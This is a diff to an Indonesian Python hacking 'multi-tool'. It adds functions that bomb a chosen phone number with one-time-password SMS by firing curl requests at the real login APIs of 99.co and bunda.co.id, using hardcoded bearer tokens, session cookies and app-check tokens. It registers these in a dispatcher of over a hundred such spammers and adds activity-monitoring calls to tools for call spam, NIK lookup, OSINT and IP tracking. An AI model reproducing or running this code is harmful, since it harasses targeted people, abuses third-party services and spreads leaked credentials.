+                    return True
+                return False
+            except:
+                return True
+        return False
+        
+    except Exception as e:
+        return False
+
+def spam_otp_99co(nomor):
+    try:
+        if nomor.startswith('0'):
+            phone = '+62' + nomor[1:]
+        elif nomor.startswith('62'):
+            phone = '+62' + nomor
+        elif nomor.startswith('+62'):
+            phone = nomor
+        else:
+            phone = '+62' + nomor
+        
+        phone = ''.join(filter(str.isdigit, phone))
+        
+        if not phone.startswith('62'):
+            phone = '62' + phone
+        
+        phone = '+' + phone
+        
+        import subprocess
+        import json
+        
+        curl_cmd = f"""curl -s -X POST 'https://www.99.co/id/api/biz/messaging/otp-events' \\
+  -H 'host: www.99.co' \\
+  -H 'sec-ch-ua-platform: "Android"' \\
+  -H 'authorization: Bearer eyJhbGciOiJFUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJybzJ6ZThOYkFNUW1QTlVVZFcwTjItNnE5bWNleHJHcHdFNS0xd3hQQWJzIn0.eyJleHAiOjE3ODcxNDg1MDcsImlhdCI6MTc4NzE0NDkwNywianRpIjoiMGJiNTk2NmUtNWFjYS00NGJiLWExYTMtNjMzNGQ3MjlkMjEyIiwiaXNzIjoiaHR0cHM6Ly9rZXljbG9hay1pZC45OS5jby9yZWFsbXMvOTlpZC1wcm9kIiwic3ViIjoiMjY3N2Y0MDAtOTVlNC00NjEzLWJlY2UtZWVkYzM0ZDE2OWE0IiwidHlwIjoiQmVhcmVyIiwiYXpwIjoiZnJvbnRlbmQtYXBwIiwic2Vzc2lvbl9zdGF0ZSI6IjMyMDhhYmU0LTI1ZjctNDIwMi1hNzljLTdkYjQ3Mzk3YzFkZSIsImFjciI6IjEiLCJyZWFsbV9hY2Nlc3MiOnsicm9sZXMiOlsic2VsbGVyIiwidW1hX2F1dGhvcml6YXRpb24iLCJkZWZhdWx0LXJvbGVzLTk5aWQtcHJvZCIsImJ1eWVyIl19LCJzY29wZSI6InByb2ZpbGUtbWluaW1pemUgY29yZS11dWlkIGVtYWlsIiwic2lkIjoiMzIwOGFiZTQtMjVmNy00MjAyLWE3OWMtN2RiNDczOTdjMWRlIiwiY29yZV91dWlkIjoiNTkxNzJkNjktODI1Ni00MWRlLWIxYTktZmFlYjQ4ODM1ZThlIiwiZW1haWxfdmVyaWZpZWQiOmZhbHNlLCJjb3JlX2NvbnN1bWVyX3V1aWQiOiJjYTE5YTJhZC1lMTlkLTQ3YTMtOGQwZS0yMzJhNjhiOGIyOTgiLCJwcmVmZXJyZWRfdXNlcm5hbWUiOiJ0ZXN0aW1vbmkgYWFhYTgjODMiLCJjb3JlX2N1c3RvbWVyX3V1aWQiOiIyNjZlYzAzYS1iZTczLTQzZWQtODEyNi02NDZjMzc2MjkxYmYiLCJlbWFpbCI6InRlc3RpbW9vb3Nra2RqczE5bWlAZ21haWwuY29tIn0.VqqVrTIAPNKv9dCTEvXfRjopfv2Pp2q1vviklB2kqMHuCSmVoYfA1OqrZF6W8qEo5cVL6joSsxTplMqHM6Da-w' \\
+  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
+  -H 'sec-ch-ua-mobile: ?1' \\
+  -H 'baggage: sentry-environment=production,sentry-release=c928e07fcd93cfdde3580c19dc671d781ef22fa0,sentry-public_key=a05fe8bc05a068bbf916024d2d1e9ed2,sentry-trace_id=ab490fa074854059a800588a8f67ff14,sentry-org_id=396133,sentry-transaction=%2F,sentry-sampled=false,sentry-sample_rand=0.5645084361255753,sentry-sample_rate=0' \\
+  -H 'sentry-trace: ab490fa074854059a800588a8f67ff14-ae1ab7e4072b3ec5-0' \\
+  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
+  -H 'accept: application/json, text/plain, */*' \\
+  -H 'content-type: application/json' \\
+  -H 'origin: https://www.99.co' \\
+  -H 'sec-fetch-site: same-origin' \\
+  -H 'sec-fetch-mode: cors' \\
+  -H 'sec-fetch-dest: empty' \\
+  -H 'referer: https://www.99.co/id' \\
+  -H 'accept-encoding: gzip, deflate, br, zstd' \\
+  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
+  -H 'cookie: _99-acs-token=eyJhbGciOiJFUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJybzJ6ZThOYkFNUW1QTlVVZFcwTjItNnE5bWNleHJHcHdFNS0xd3hQQWJzIn0.eyJleHAiOjE3ODcxNDg1MDcsImlhdCI6MTc4NzE0NDkwNywianRpIjoiMGJiNTk2NmUtNWFjYS00NGJiLWExYTMtNjMzNGQ3MjlkMjEyIiwiaXNzIjoiaHR0cHM6Ly9rZXljbG9hay1pZC45OS5jby9yZWFsbXMvOTlpZC1wcm9kIiwic3ViIjoiMjY3N2Y0MDAtOTVlNC00NjEzLWJlY2UtZWVkYzM0ZDE2OWE0IiwidHlwIjoiQmVhcmVyIiwiYXpwIjoiZnJvbnRlbmQtYXBwIiwic2Vzc2lvbl9zdGF0ZSI6IjMyMDhhYmU0LTI1ZjctNDIwMi1hNzljLTdkYjQ3Mzk3YzFkZSIsImFjciI6IjEiLCJyZWFsbV9hY2Nlc3MiOnsicm9sZXMiOlsic2VsbGVyIiwidW1hX2F1dGhvcml6YXRpb24iLCJkZWZhdWx0LXJvbGVzLTk5aWQtcHJvZCIsImJ1eWVyIl19LCJzY29wZSI6InByb2ZpbGUtbWluaW1pemUgY29yZS11dWlkIGVtYWlsIiwic2lkIjoiMzIwOGFiZTQtMjVmNy00MjAyLWE3OWMtN2RiNDczOTdjMWRlIiwiY29yZV91dWlkIjoiNTkxNzJkNjktODI1Ni00MWRlLWIxYTktZmFlYjQ4ODM1ZThlIiwiZW1haWxfdmVyaWZpZWQiOmZhbHNlLCJjb3JlX2NvbnN1bWVyX3V1aWQiOiJjYTE5YTJhZC1lMTlkLTQ3YTMtOGQwZS0yMzJhNjhiOGIyOTgiLCJwcmVmZXJyZWRfdXNlcm5hbWUiOiJ0ZXN0aW1vbmkgYWFhYTgjODMiLCJjb3JlX2N1c3RvbWVyX3V1aWQiOiIyNjZlYzAzYS1iZTczLTQzZWQtODEyNi02NDZjMzc2MjkxYmYiLCJlbWFpbCI6InRlc3RpbW9vb3Nra2RqczE5bWlAZ21haWwuY29tIn0.VqqVrTIAPNKv9dCTEvXfRjopfv2Pp2q1vviklB2kqMHuCSmVoYfA1OqrZF6W8qEo5cVL6joSsxTplMqHM6Da-w; _99-ref-token=eyJhbGciOiJIUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICI0MjllZjYyYy03NDU4LTRhMDQtOTNlNC1mMDJjYWNiZjY4NTcifQ.eyJleHAiOjE3ODc3NDk3MDcsImlhdCI6MTc4NzE0NDkwNywianRpIjoiZjI3OTlmYjktYTQ5ZC00MjY4LTk3MzEtMDE1NTExNWE2ODUxIiwiaXNzIjoiaHR0cHM6Ly9rZXljbG9hay1pZC45OS5jby9yZWFsbXMvOTlpZC1wcm9kIiwiYXVkIjoiaHR0cHM6Ly9rZXljbG9hay1pZC45OS5jby9yZWFsbXMvOTlpZC1wcm9kIiwic3ViIjoiMjY3N2Y0MDAtOTVlNC00NjEzLWJlY2UtZWVkYzM0ZDE2OWE0IiwidHlwIjoiUmVmcmVzaCIsImF6cCI6ImZyb250ZW5kLWFwcCIsInNlc3Npb25fc3RhdGUiOiIzMjA4YWJlNC0yNWY3LTQyMDItYTc5Yy03ZGI0NzM5N2MxZGUiLCJzY29wZSI6InByb2ZpbGUtbWluaW1pemUgY29yZS11dWlkIGVtYWlsIiwic2lkIjoiMzIwOGFiZTQtMjVmNy00MjAyLWE3OWMtN2RiNDczOTdjMWRlIn0.40VVHypaU2lxlcNif3cyNKNQ6NqCESpC9F6gpa4R4TA; country=ID; _fbp=fb.1.1783634838553.530234959419040031; __cf_bm=mHd7ebZZvr9QC4g39gJRTX7n8RbxTABa2vptnPN2jnY-1787144797.8016622-1.0.1.1-XuJ5D0MeHxyWcNU8ijk.OhbYJMH9JyHuoOPWG8NxQlnURKBzM92HhOPEnC22T6gv1lGsn.Q94dkbDfxAh0obTw30tgNFaVAYsKCcoHDul_e5o4iQ3AdY4oQVdsRmqus9; NEXT_LOCALE=en; nid=1468adb9-ef60-4b93-80f8-67f6d905429b; ajs_anonymous_id=1468adb9-ef60-4b93-80f8-67f6d905429b; WZRK_G=c5063a1d88cc4d57b481ff69e6271672; WZRK_S_6Z6-5Z4-R56Z=%7B%22p%22%3A1%2C%22s%22%3A1787144803%2C%22t%22%3A1787144805%7D; dbb_rum=%7B%22date%22%3A1787144796651%2C%22id%22%3A%22mt03vai3tjl67ja56e.i%22%2C%22hnc%22%3A1%2C%22nc%22%3A1%2C%22conv%22%3A%5B%5D%2C%22sample%22%3Afalse%7D; g_state={"i_l":0,"i_ll":1787144808996,"i_b":"4d9tCoq6T065IxLpbI3/B9pCnohc4rpf66c/WYlUFiM","i_e":{"enable_itp_optimization":24},"i_et":1787144808996}; _xsrf=2|c7bf88e2|2ee5e97e7c0d5421580d7ed032370b4e|1787144810; _gcl_au=1.1.642346103.1783634927; _gid=GA1.2.998693239.1787144812; _ga_6C5VMQ1JNP=GS2.1.s1787144812$o1$g0$t1787144813$j59$l0$h0; _ga_GG21BH9GS5=GS2.1.s1787144813$o1$g0$t1787144813$j60$l0$h0; __rtbh.uid=%7B%22eventType%22%3A%22uid%22%2C%22id%22%3A%22unknown%22%2C%22expiryDate%22%3A%222027-08-19T13%3A06%3A54.597Z%22%7D; __rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22GAhcAYFrDoxEYfSp94nX%22%2C%22expiryDate%22%3A%222027-08-19T13%3A06%3A54.600Z%22%7D; _ga_9FDXXVZSH0=GS2.1.s1787144814$o1$g0$t1787144814$j60$l0$h0; meid=ddb8aaf2-e634-40d3-bdde-198c0d309838; intercom-id-e90pxaa2=a14209fa-dc61-4abe-94cc-e50af422bdd5; intercom-session-e90pxaa2=; intercom-device-id-e90pxaa2=154bdeab-bd24-418e-b61a-3d77de4e79b9; _ga_ZJWD7VVPHG=GS2.2.s1787144822$o2$g0$t1787144822$j60$l0$h0; _ga=GA1.1.1461816152.1783634837; cto_bundle=RcS8X19sbFllSDZ6eG1VcEtESVM0ZDglMkJycFA1RlFIRGg4WGxyS01OcUV3MjdYVlZtdlhrcUglMkJ1c2J6MXN6UTVHVjR0Mnc5ZHkzZDdzOVVRcVVTOVlKUXlTUTZXV3BDeVZ6UXNmbzZhc0tBS1ElMkIxUzclMkJSYUx2NzZ2UDU3OURyY0lhc0tiaFc2JTJCa0dHRWlFSm1meWhMakZtMEJRJTNEJTNE; _ga_Q823T54LSF=GS2.1.s1787144823$o2$g1$t1787144905$j38$l0$h0' \\
+  -H 'priority: u=1, i' \\
+  -d '{{"brand":"99id","destination_address":"{phone}","type_id":2}}'"""
+        
+        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
+        
+        if result.returncode == 0 and result.stdout:
+            try:
+                data = json.loads(result.stdout)
+                if data.get('success') or data.get('status') == 'success':
+                    return True
+                if data.get('message') and 'otp' in str(data.get('message')).lower():
+                    return True
+                return False
+            except:
+                return True
+        return False
+        
+    except Exception as e:
+        return False
+
+def spam_otp_bunda_cms(nomor):
+    try:
+        if nomor.startswith('0'):
+            phone = nomor
+        elif nomor.startswith('62'):
+            phone = '0' + nomor[2:]
+        elif nomor.startswith('+62'):
+            phone = '0' + nomor[3:]
+        else:
+            phone = '0' + nomor
+        
+        phone = ''.join(filter(str.isdigit, phone))
+        
+        if not phone.startswith('0'):
+            phone = '0' + phone
+        
+        import subprocess
+        import json
+        
+        curl_cmd = f"""curl -s -X POST 'https://cms.bunda.co.id/api/v1/auth/send-otp' \\
+  -H 'host: cms.bunda.co.id' \\
+  -H 'sec-ch-ua-platform: "Android"' \\
+  -H 'x-firebase-appcheck: eyJraWQiOiJrMnhhbUEiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxOjU5NjU2Mzg5ODEwMzp3ZWI6Y2VmNTMwYWNmYjgzZGY4NDdhZWRmMiIsImF1ZCI6WyJwcm9qZWN0cy81OTY1NjM4OTgxMDMiLCJwcm9qZWN0cy9ibWhzLXdlYi1hcHBzIl0sInByb3ZpZGVyIjoicmVjYXB0Y2hhX3YzIiwiaXNzIjoiaHR0cHM6Ly9maXJlYmFzZWFwcGNoZWNrLmdvb2dsZWFwaXMuY29tLzU5NjU2Mzg5ODEwMyIsImV4cCI6MTc4NzIzNzQ1MCwiaWF0IjoxNzg3MTUxMDUwLCJqdGkiOiJ4YUEydzFUWnpxVHgtU2NHOGVQUGRqRkV3OHRVWUZhdXhfa3ExckthNVpBIn0.0GtUrReLPvBzyUZSeojw_D4CQfRcIhYS4kwTpuwMmbpQ8VquBJUyaEcSl28Rpq0_LrEcRkz-nHrAHtD2V-trDLQYzXIq2rC-JYWm3YadIDgh3FQ_nWrzdUUHfDLwCpgUU0QdopTXt1IkqEVK29vHjndK-s4yADZtVkV61DNzUKQKqCwcEH2Imw9q7GFEo19EhIYLIVd06Zdvit_GnPr93zYtuwzuIMPXcOghmqzsgER0vec2JQAr7oIc7Za47y_MNhtfJ5duSoDDb0MzyHaMJ0xX_-s6WIWT8gUI2uCwW2asUALRSouydvlOgMGpBkcZHAThBLYJ3k11iNEUUV-nwVb15PUjLM6y3XRHWXwEZ_1WAVy3GDFk-mxnGY8ez2X1xX64JJSVJMMqbwl_V0XccWPtlYEBP3MvmpgVl33lF6Pb9ZMaVAVv2C2h_8V6ik0rhsequDyDgd1as20UUagHfZEUIJCiMhktSc2yykuoGiXVTasq5dROxcQgEwPYN66x' \\
+  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
+  -H 'sec-ch-ua-mobile: ?1' \\
+  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
+  -H 'accept: application/json, text/plain, */*' \\
+  -H 'content-type: application/json' \\
+  -H 'x-locale: id' \\
+  -H 'origin: https://www.bunda.co.id' \\
+  -H 'sec-fetch-site: same-site' \\
+  -H 'sec-fetch-mode: cors' \\
+  -H 'sec-fetch-dest: empty' \\
+  -H 'referer: https://www.bunda.co.id/id' \\
+  -H 'accept-encoding: gzip, deflate, br, zstd' \\
+  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
+  -H 'priority: u=1, i' \\
+  -d '{{"phone_number":{phone},"type":"auth"}}'"""
+        
+        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
+        
+        if result.returncode == 0 and result.stdout:
+            try:
+                data = json.loads(result.stdout)
+                if data.get('success') or data.get('status') == 'success':
+                    return True
+                if data.get('message') and 'otp' in str(data.get('message')).lower():
+                    return True
+                return False
+            except:
+                return True
+        return False
+        
+    except Exception as e:
+        return False
+
 def loading_spinner():
     chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
     i = 0
@@ -5467,6 +5838,11 @@ def mulai_spam(nomor):
      "101": spam_otp_kitabisa_wea,
      "102": spam_otp_auto2000,
      "103": spam_otp_buccheri,
+     "104": spam_otp_generasimaju,
+     "105": spam_otp_norkaroots,
+     "106": spam_otp_kpoin,
+     "107": spam_otp_99co,
+     "108": spam_otp_bunda_cms,
 }
      hasil = {}
      total_api = len(apis)
@@ -5632,6 +6008,7 @@ def tool_otp_spam():
     mulai_spam(nomor)
     
 def tool_pairing_spam():
+    pantau_aktivitas()
     import os, sys, time, json, requests, threading
     
     os.system('clear')
@@ -5757,6 +6134,7 @@ def tool_pairing_spam():
         return
 
 def tool_osint():
+    pantau_aktivitas()
     import os, sys, time, json, requests, threading, re, socket
     from datetime import datetime
     import phonenumbers
@@ -6151,6 +6529,7 @@ def tool_osint():
             input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")
 
 def tool_spam_report():
+    pantau_aktivitas()
     a = '\x1b[1;30m'
     m = '\x1b[1;31m'
     h = '\x1b[1;32m'
@@ -8193,6 +8572,7 @@ if __name__=='__main__':
    input(f"\n{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")
 
 def tool_ip_tracker():
+    pantau_aktivitas()
     import os, sys, time, json, requests, threading
     
     os.system('clear')
@@ -8553,6 +8933,7 @@ def tool_port_scanner():
     input(f"\n{Y}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")
 
 def tool_nik_checker():
+    pantau_aktivitas()
     import os, sys, time, json, requests, threading
     
     os.system('clear')
@@ -8708,6 +9089,7 @@ def tool_nik_checker():
     input(f"\n{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")
 
 def tool_spam_NGL():
+    pantau_aktivitas()
     import os, sys, time, json, requests, threading, random, uuid
     
     os.system('clear')
@@ -9079,6 +9461,7 @@ def tool_tiktok_downloader():
     sys.stdout.flush()
 
  def banner_tiktok():
+    pantau_aktivitas()
     clear_screen()
     banner_Tiktok = """
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣶⣶⣶⣶⣶⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -9431,6 +9814,7 @@ def tool_list_user():
     print()
     input(f"{W}Tekan Enter untuk kembali...{N}")
 def tool_spam_call():
+    pantau_aktivitas()
     import os, sys, time, random, string, requests, json, threading
     
     os.system('clear')
@@ -9573,6 +9957,7 @@ def tool_spam_call():
         return
         
 def cek_kode_pos():
+    pantau_aktivitas()
     import os, sys, time, threading, json, requests
     
     os.system('clear')
@@ -10248,6 +10633,7 @@ def cek_kode_pos():
         print(f"{W}╰─────────────────────────────────────────────────────────────╯")
         input(f"\n{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")
 def tool_cek_npsn():
+    pantau_aktivitas()
     import os, sys, time, json, requests, threading, subprocess
     
     os.system('clear')
@@ -12679,6 +13065,1155 @@ def tool_tambahan():
           os.system('xdg-open \'https://b.top4top.io/p_3882mdyun0.jpg\'')
           time.sleep(3)
 
+def tool_photo_to_url():
+    import os, sys, time, requests, threading
+    
+    os.system('clear')
+    
+    ascii_photo = """
+⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⢀⣴⣾⣿⠿⠿⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠻⠿⣿⣿⣦⣄⠀⠀⠀⠀
+⠀⢀⣴⣿⡟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣷⡀⠀⠀
+⠀⣾⣿⠋⠀⠀⠀⠀⣀⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⡀⠀
+⢰⣿⡏⠀⠀⠀⢀⣾⣿⠟⠛⢿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣧⠀
+⢸⣿⡇⠀⠀⠀⠸⣿⣿⠀⠀⢀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀
+⢸⣿⡇⠀⠀⠀⠀⠹⢿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣶⡀⠀⠀⠀⠀⠀⣿⣿⠀
+⢸⣿⡇⠀⠀⠀⠀⠀⠀⠈⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⠟⠁⠈⠻⣿⣦⡀⠀⠀⠀⣿⣿⠀
+⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⠋⠀⠀⠀⠀⠘⢿⣿⣦⡀⠀⣿⣿⠀
+⢸⣿⡇⠀⠀⠀⠀⣀⣠⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣦⣿⣿⠀
+⢸⣿⡇⠀⠀⣠⣾⣿⠿⢿⣿⣦⡀⠀⠀⠀⠀⢠⣾⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⠀
+⢸⣿⡇⣠⣾⣿⠟⠁⠀⠀⠙⢿⣿⣦⡀⠀⣴⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀
+⢸⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠉⠻⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀
+⢸⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀
+⠸⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡟⠀
+⠀⢻⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⡿⠁⠀
+⠀⠀⠙⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⠟⠁⠀⠀
+⠀⠀⠀⠀⠙⠿⣿⣿⣷⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣿⣿⠿⠛⠁⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀
+"""
+    os.system(f'echo "{ascii_photo}" | lolcat 2>/dev/null || echo "{ascii_photo}"')
+    
+    print(f"""
+{W}╭─────────────────────────────────────────────────────────────────╮
+{W}│ {W}Tools {R}: {G}Photo to URL {R}│ {W}Developer {R}: {G}Rullzzz06
+{W}╰─────────────────────────────────────────────────────────────────╯
+{W}╭─────────────────────────────────────────────────────────────────╮
+{W}│ Masukkan Path file Foto {R}/{W} Video
+{W}│ Contoh {R}:{a} /sdcard/DCIM/Camera/bokep.mp4
+{W}│ Atau   {R}:{a} /sdcard/DCIM/Camera/IMG.jpg
+{W}╰─────────────────────────────────────────────────────────────────╯""")
+    file_path = input(f"{U}❯❯❯ {W}Path file {G}❯{N} ").strip()
+    
+    if not file_path:
+        print(f"\n{W}[ {R}??{W} ] Path tidak boleh kosong!{N}")
+        input(f"{U}❯❯❯ {W}Tekan Enter untuk kembali...{N}")
+        return
+    
+    if not os.path.exists(file_path):
+        print(f"\n{W}[ {R}??{W} ] File tidak ditemukan!{N}")
+        input(f"{U}❯❯❯ {W}Tekan Enter untuk kembali...{N}")
+        return
+    
+    file_size = os.path.getsize(file_path) / (1024 * 1024)
+    if file_size > 200:
+        print(f"\n{W}[ {R}??{W} ] File terlalu besar! Maksimal 200MB{N}")
+        input(f"{U}❯❯❯ {W}Tekan Enter untuk kembali...{N}")
+        return
+    
+    def load_bar_upload(stop_event):
+        COLORS = ['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m']
+        RESET = '\x1b[0m'
+        length = 15
+        color_index = 0
+        while not stop_event.is_set():
+            for i in range(length + 1):
+                if stop_event.is_set():
+                    break
+                filled_color = COLORS[color_index % len(COLORS)] + '■' * i + RESET
+                empty = '□' * (length - i)
+                sys.stdout.write(f'\r [ {G}✦{W} ] Mengupload File [[{filled_color}{empty}{W}]]')
+                sys.stdout.flush()
+                time.sleep(0.05)
+                color_index += 1
+        sys.stdout.write('\r' + ' ' * 120 + '\r')
+        sys.stdout.flush()
+    
+    def upload_catbox(file_path):
+        try:
+            with open(file_path, 'rb') as f:
+                files = {'fileToUpload': (os.path.basename(file_path), f)}
+                data = {'reqtype': 'fileupload'}
+                
+                headers = {
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+                }
+                
+                resp = requests.post('https://catbox.moe/user/api.php', files=files, data=data, headers=headers, timeout=60)
+                
+                if resp.status_code == 200:
+                    url = resp.text.strip()
+                    if url.startswith('https://'):
+                        return url, None
+                    else:
+                        return None, resp.text
+                else:
+                    return None, f"Status: {resp.status_code}"
+                    
+        except Exception as e:
+            return None, str(e)
+    
+    stop = threading.Event()
+    t = threading.Thread(target=load_bar_upload, args=(stop,))
+    t.daemon = True
+    t.start()
+    
+    url, error = upload_catbox(file_path)
+    
+    stop.set()
+    t.join()
+    
+    if url:
+        filename = os.path.basename(file_path)
+        file_size_kb = os.path.getsize(file_path) / 1024
+        
+        print(f"{W}╭─────────────────────────────────────────────────────────────────╮")
+        print(f"{W}│ {G}✓{W} Upload Berhasil!{N}")
+        print(f"{W}├─────────────────────────────────────────────────────────────────┤")
+        print(f"{W}│ {W}File      {R}: {G}{filename}{N}")
+        print(f"{W}│ {W}Size      {R}: {G}{file_size_kb:.2f} KB{N}")
+        print(f"{W}│ {W}URL       {R}: {G}{url}{N}")
+        print(f"{W}╰─────────────────────────────────────────────────────────────────╯")
+    else:
+        print(f"\n{W}[ {R}??{W} ] Upload gagal: {error}{N}")
+    
+    input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} untuk kembali...{N}")
+
+def tool_file_to_url():
+    import os, sys, time, requests, threading
+    
+    os.system('clear')
+    
+    ascii_photo = """
+⠀⣠⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣤⡀
+⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
